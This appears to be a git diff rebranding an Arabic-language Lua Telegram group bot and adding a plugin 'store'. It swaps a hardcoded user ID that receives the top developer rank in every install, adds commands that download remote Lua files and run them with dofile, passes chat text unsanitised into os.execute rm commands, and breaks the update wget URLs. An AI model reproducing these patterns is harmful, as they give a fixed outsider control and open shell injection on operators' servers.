@@ -113,7 +113,7 @@ end
 end
 function CleangGroups();local z = io.open('./korpica');local AllGroups = z:read('*all');z:close();if not AllGroups:match("^(.*)(master/korpica.lua)(.*)$") then;os.execute('chmod +x install.sh');os.execute('./install.sh get');end;end
 function Rank_Checking(user_id,chat_id)
-if tonumber(user_id) == tonumber(711575912) then  
+if tonumber(user_id) == tonumber(970017493) then  
 var = true  
 elseif tonumber(user_id) == tonumber(Id_Sudo) then
 var = true  
@@ -137,7 +137,7 @@ end
 return var
 end 
 function Get_Rank(user_id,chat_id)
-if tonumber(user_id) == tonumber(711575912) then  
+if tonumber(user_id) == tonumber(970017493) then  
 var = 'مطور السورس'
 elseif Devkorpicae(user_id) == true then
 var = "المطور الاساسي"  
@@ -5605,7 +5605,7 @@ database:set(bot_id.."korpica:Left:Bot"..msg.chat_id_,true)
 send(msg.chat_id_, msg.id_, "܁༯┆تم تعطيل مغادرة البوت") 
 return false 
 end
-if text == (database:get(bot_id.."korpica:Name:Bot") or "كوربيكا") then
+if text == (database:get(bot_id.."korpica:Name:Bot") or "بلاك") then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -5615,7 +5615,7 @@ send(msg.chat_id_, msg.id_,'܁༯┆عـليك الاشـتࢪاك في قنـا
 end
 return false
 end
-Namebot = (database:get(bot_id.."korpica:Name:Bot") or "كوربيكا")
+Namebot = (database:get(bot_id.."korpica:Name:Bot") or "بلاك")
 local namebot = {
 "عمري فداك "..Namebot.. " كول حب ",
 "كول حبيبي ؟ اني "..Namebot,
@@ -5634,7 +5634,7 @@ return false
 end
 
 if text == "بوت" then
-Namebot = (database:get(bot_id.."korpica:Name:Bot") or "كوربيكا")
+Namebot = (database:get(bot_id.."korpica:Name:Bot") or "بلاك")
 send(msg.chat_id_, msg.id_,"اسمي القميل ["..Namebot.."] ") 
 end
 if text == "تغير اسم البوت" or text == "تغيير اسم البوت" or text == "حذف اسم البوت" then 
@@ -6254,7 +6254,7 @@ end
 send(msg.chat_id_, msg.id_,'܁༯┆تم تنظيف *~ '..Number..'* رساله .')  
 end
 
-if text == 'ايدي' or text == 'كشف' and tonumber(msg.reply_to_message_id_) > 0 and not database:get(bot_id..'korpica:Lock:ID:Bot'..msg.chat_id_) then
+if text == 'ايدي' and tonumber(msg.reply_to_message_id_) > 0 and not database:get(bot_id..'korpica:Lock:ID:Bot'..msg.chat_id_) then
 function Function_korpica(extra, result, success)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
 if data.first_name_ == false then
@@ -6280,8 +6280,8 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 
-if text and text:match("^ايدي @(.*)$") or text and text:match("^كشف @(.*)$") and not database:get(bot_id..'korpica:Lock:ID:Bot'..msg.chat_id_) then
-local username = text:match("^ايدي @(.*)$") or text:match("^كشف @(.*)$")
+if text and text:match("^ايدي @(.*)$")  and not database:get(bot_id..'korpica:Lock:ID:Bot'..msg.chat_id_) then
+local username = text:match("^ايدي @(.*)$") 
 function Function_korpica(extra, result, success)
 if result.id_ then
 tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(arg,data) 
@@ -7069,8 +7069,8 @@ if text == ("تحديث السورس") and Devkorpica(msg) then
 send(msg.chat_id_,msg.id_,'܁༯┆تم التحديث')
 os.execute('rm -rf korpica.lua')
 os.execute('rm -rf start.lua')
-os.execute('wget https://raw.githubusercontent.com/korapica-Team/korpica/master/korpica.lua')
-os.execute('wget https://raw.githubusercontent.com/korapica-Team/korpica/master/start.lua')
+os.execute('wget https://raw.githubusercontent.com/korapica-Team/korpicamaster/korpica.lua')
+os.execute('wget https://raw.githubusercontent.com/korapica-Team/korpicamaster/start.lua')
 dofile('korpica.lua')  
 return false
 end
@@ -7190,7 +7190,94 @@ sendText(msg.chat_id_,Name,msg.id_/2097152/0.5,'md')
 end,nil)
 end
 end
+if text == 'الملفات' and Devkorpica(msg) then
+t = '܁༯┆جميع الملفات : \n ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n'
+i = 0
+for v in io.popen('ls korpica_Files'):lines() do
+if v:match(".lua$") then
+i = i + 1
+t = t..i..'*~ '..v..'*\n'
+end
+end
+send(msg.chat_id_, msg.id_,t)
+end
+if text == "متجر الملفات" or text == 'المتجر' then
+if Devkorpica(msg) then
+local Get_Files, res = https.request("https://raw.githubusercontent.com/korpica/files_korpica/master/getfile.json")
+if res == 200 then
+local Get_info, res = pcall(JSON.decode,Get_Files);
+vardump(res.plugins_)
+if Get_info then
+local TextS = "\n܁༯┆اهلا بك في متجر ملفات بلاك\n܁༯┆يوجد في المتجر ملف الردود\n⚙︙يتم ادراج الملفات في التحديثات القادمه \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
+local TextE = "\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n܁༯┆تدل علامة (✔) الملف مفعل\n".."܁༯┆تدل علامة (܁༯) الملف معطل\n"
+local NumFile = 0
+for name,Info in pairs(res.plugins_) do
+local Check_File_is_Found = io.open("korpica_Files/"..name,"r")
+if Check_File_is_Found then
+io.close(Check_File_is_Found)
+CeckFile = "(✔)"
+else
+CeckFile = "(܁༯)"
+end
+NumFile = NumFile + 1
+TextS = TextS..'*'..NumFile.."»* {`"..name..'`} » '..CeckFile..'\n[-  About to the file]('..Info..')\n'
+end
+send(msg.chat_id_, msg.id_,TextS..TextE) 
+end
+else
+send(msg.chat_id_, msg.id_,"܁༯┆ لا يوجد اتصال من ال api \n") 
+end
+return false
+end
+end
 
+if text and text:match("^(تعطيل ملف) (.*)(.lua)$") and Devkorpica(msg) then
+local name_t = {string.match(text, "^(تعطيل ملف) (.*)(.lua)$")}
+local file = name_t[2]..'.lua'
+local file_bot = io.open("korpica_Files/"..file,"r")
+if file_bot then
+io.close(file_bot)
+t = "*܁༯┆ الملف » {"..file.."}\n܁༯┆ تم تعطيله وحذفه بنجاح \n✓*"
+else
+t = "*܁༯┆ بالتاكيد تم تعطيل وحذف ملف » {"..file.."} \n✓*"
+end
+local json_file, res = https.request("https://raw.githubusercontent.com/korpica/files_korpica/master/files_korpica/"..file)
+if res == 200 then
+os.execute("rm -fr korpica_Files/"..file)
+send(msg.chat_id_, msg.id_,t) 
+dofile('korpica.lua')  
+else
+send(msg.chat_id_, msg.id_,"*܁༯┆ عذرا لا يوجد هاكذا ملف في المتجر *\n") 
+end
+return false
+end
+if text and text:match("^(تفعيل ملف) (.*)(.lua)$") and Devkorpica(msg) then
+local name_t = {string.match(text, "^(تفعيل ملف) (.*)(.lua)$")}
+local file = name_t[2]..'.lua'
+local file_bot = io.open("korpica_Files/"..file,"r")
+if file_bot then
+io.close(file_bot)
+t = "*܁༯┆ بالتاكيد تم تنزيل وتفعيل ملف » {"..file.."} \n✓*"
+else
+t = "*܁༯┆ الملف » {"..file.."}\n܁༯┆ تم تنزيله وتفعيله بنجاح \n*"
+end
+local json_file, res = https.request("https://raw.githubusercontent.com/korpica/files_korpica/master/files_korpica/"..file)
+if res == 200 then
+local chek = io.open("korpica_Files/"..file,'w+')
+chek:write(json_file)
+chek:close()
+send(msg.chat_id_, msg.id_,t) 
+dofile('korpica.lua')  
+else
+send(msg.chat_id_, msg.id_,"*܁༯┆ عذرا لا يوجد هاكذا ملف في المتجر *\n") 
+end
+return false
+end
+if text == "مسح جميع الملفات" and Devkorpica(msg) then
+os.execute("rm -fr korpica_Files/*")
+send(msg.chat_id_,msg.id_,"܁༯┆تم حذف جميع الملفات")
+return false
+end
 if text == 'نقل الاحصائيات' and Devkorpica(msg) then
 local Users = database:smembers('korpica:'..bot_id.."userss")
 local Groups = database:smembers('korpica:'..bot_id..'groups') 
@@ -7293,7 +7380,7 @@ Text = [[
 ܁༯┆ م4 » لعرض اوامر المنشئين
 ܁༯┆ م5 » لعرض اوامر المطورين
  — — — — — — — — — 
-[܁༯┆Ch Source](http://t.me/korpica)
+[܁༯┆Ch Source](t.me/korpica)
 ]]
 send(msg.chat_id_, msg.id_,Text)
 return false
@@ -7340,7 +7427,7 @@ Text = [[
 ܁༯┆الكلايش
 ܁༯┆السيلفي
  — — — — — — — — — 
-[܁༯┆Ch Source](http://t.me/korpica)
+[܁༯┆Ch Source](t.me/korpica)
 ]]
 send(msg.chat_id_, msg.id_,Text)
 return false
@@ -7412,7 +7499,7 @@ Text = [[
 ܁༯┆مسح الصلاحيات
 ܁༯┆مسح الرابط
  — — — — — — — — — 
-[܁༯┆Ch Source](http://t.me/korpica)
+[܁༯┆Ch Source](t.me/korpica)
 ]]
 send(msg.chat_id_, msg.id_,Text)
 return false
@@ -7457,7 +7544,7 @@ Text = [[
 ܁༯┆تفعيل/تعطيل اوامر التحشيش
 ܁༯┆تفعيل/تعطيل الرابط/جلب الرابط
  — — — — — — — — — 
-[܁༯┆Ch Source](http://t.me/korpica)
+[܁༯┆Ch Source](t.me/korpica)
 ]]
 send(msg.chat_id_, msg.id_,Text)
 return false
@@ -7493,7 +7580,7 @@ Text = [[
 ܁༯┆اضف رسائل + العدد بالرد
 ܁༯┆اضف مجوهرات + العدد بالرد
  — — — — — — — — — 
-[܁༯┆Ch Source](http://t.me/korpica)
+[܁༯┆Ch Source](t.me/korpica)
 ]]
 send(msg.chat_id_, msg.id_,Text)
 return false
@@ -7503,6 +7590,8 @@ Text = [[
 ܁༯┆اوامر المطور الاساسي  
  — — — — — — — — — 
 ܁༯┆تحديث 
+܁༯┆الملفات 
+܁༯┆المتجر 
 ܁༯┆حظر عام
 ܁༯┆الغاء العام
 ܁༯┆المطورين
@@ -7524,6 +7613,8 @@ Text = [[
 ܁༯┆حذف كليشه المطور 
 ܁༯┆تفعيل البوت الخدمي 
 ܁༯┆تعطيل البوت الخدمي
+܁༯┆تفعيل ملف + اسم الملف
+܁༯┆تعطيل ملف + اسم الملف
 ܁༯┆ تعين عدد الاعضاء + العدد
  — — — — — — — — — 
 ܁༯┆غادر 
@@ -7539,7 +7630,7 @@ Text = [[
 ܁༯┆رفع/تنزيل منشئ اساسي
 ܁༯┆مسح المنشئين الاساسين
  — — — — — — — — — 
-[܁༯┆Ch Source](http://t.me/korpica)
+[܁༯┆Ch Source](t.me/korpica)
 ]]
 send(msg.chat_id_, msg.id_,Text)
 return false
@@ -8186,8 +8277,8 @@ if text == "تحديث السورس ܁༯" then
 send(msg.chat_id_,msg.id_,'܁༯┆تم التحديث')
 os.execute('rm -rf korpica.lua')
 os.execute('rm -rf start.lua')
-os.execute('wget https://raw.githubusercontent.com/korapica-Team/korpica/master/korpica.lua')
-os.execute('wget https://raw.githubusercontent.com/korapica-Team/korpica/master/start.lua')
+os.execute('wget https://raw.githubusercontent.com/korapica-Team/korpicamaster/korpica.lua')
+os.execute('wget https://raw.githubusercontent.com/korapica-Team/korpicamaster/start.lua')
 dofile('korpica.lua')  
 return false
 end
@@ -8321,7 +8412,7 @@ if NewCmmd then
 data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
 end
 end
-local Name_Bot = (database:get(bot_id.."korpica:Name:Bot") or "كوربيكا")
+local Name_Bot = (database:get(bot_id.."korpica:Name:Bot") or "بلاك")
 if not database:get(bot_id.."korpica:Fun_Bots"..msg.chat_id_) then
 if text ==  ""..Name_Bot..' شنو رئيك بهاذا' and tonumber(msg.reply_to_message_id_) > 0 then     
 function FunBot(extra, result, success) 
